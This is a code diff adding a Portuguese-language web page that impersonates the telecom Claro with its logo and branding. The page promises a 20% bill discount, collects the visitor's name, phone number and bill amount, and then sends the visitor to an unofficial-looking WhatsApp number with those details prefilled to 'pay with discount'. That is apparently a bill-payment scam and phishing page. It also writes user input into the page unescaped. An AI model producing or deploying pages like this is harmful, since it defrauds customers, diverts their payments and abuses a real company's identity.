@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Desconto Claro - 20% na Fatura</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+    }
+    .tela {
+      display: none;
+      padding: 40px 20px;
+      max-width: 500px;
+      margin: auto;
+      text-align: center;
+    }
+    .ativa {
+      display: block;
+    }
+    img.logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #e60000;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #e60000;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    form {
+      background-color: #f9f9f9;
+      padding: 25px;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    .resultado {
+      background-color: #e6ffe6;
+      padding: 20px;
+      border: 2px dashed #4CAF50;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Tela 1 -->
+  <div id="tela1" class="tela ativa">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Claro_logo_2022.svg" alt="Claro" class="logo">
+    <h1>Obtenha 20% de Desconto na sua Fatura Claro</h1>
+    <p>Aproveite esta oferta exclusiva agora mesmo.</p>
+    <button onclick="mostrarTela2()">Clique aqui para obter o desconto</button>
+  </div>
+
+  <!-- Tela 2 -->
+  <div id="tela2" class="tela">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Claro_logo_2022.svg" alt="Claro" class="logo">
+    <h1>Preencha seus dados</h1>
+    <form id="formulario">
+      <input type="text" id="nome" placeholder="Nome completo" required>
+      <input type="tel" id="telefone" placeholder="Telefone com DDD" required>
+      <input type="number" id="valor" placeholder="Valor da fatura (R$)" required step="0.01">
+      <button type="submit">Calcular desconto</button>
+    </form>
+    <div id="resultado" class="resultado" style="display: none;"></div>
+  </div>
+
+  <script>
+    function mostrarTela2() {
+      document.getElementById('tela1').classList.remove('ativa');
+      document.getElementById('tela2').classList.add('ativa');
+    }
+
+    document.getElementById('formulario').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const nome = document.getElementById('nome').value;
+      const telefone = document.getElementById('telefone').value;
+      const valor = parseFloat(document.getElementById('valor').value);
+      const desconto = valor * 0.20;
+      const valorComDesconto = valor - desconto;
+
+      const resultado = document.getElementById('resultado');
+      resultado.style.display = 'block';
+      resultado.innerHTML = `
+        <h2>Parabéns, ${nome}!</h2>
+        <p>Você ganhou <strong>20% de desconto</strong> na sua fatura Claro.</p>
+        <p>Valor original: R$ ${valor.toFixed(2)}</p>
+        <p>Desconto: R$ ${desconto.toFixed(2)}</p>
+        <p><strong>Valor com desconto: R$ ${valorComDesconto.toFixed(2)}</strong></p>
+        <p>Entre em contato agora mesmo para pagar com desconto:</p>
+        <a href="https://wa.me/557192174831?text=Olá,%20sou%20${encodeURIComponent(nome)}.%20Quero%20pagar%20minha%20fatura%20Claro%20com%2020%%20de%20desconto.%20Meu%20telefone%20é%20${encodeURIComponent(telefone)}%20e%20o%20valor%20da%20fatura%20é%20R$${valor.toFixed(2)}." target="_blank">
+          <button style="margin-top:10px;background-color:#25D366;">Falar no WhatsApp</button>
+        </a>
+      `;
+    });
+  </script>
+</body>
+</html>
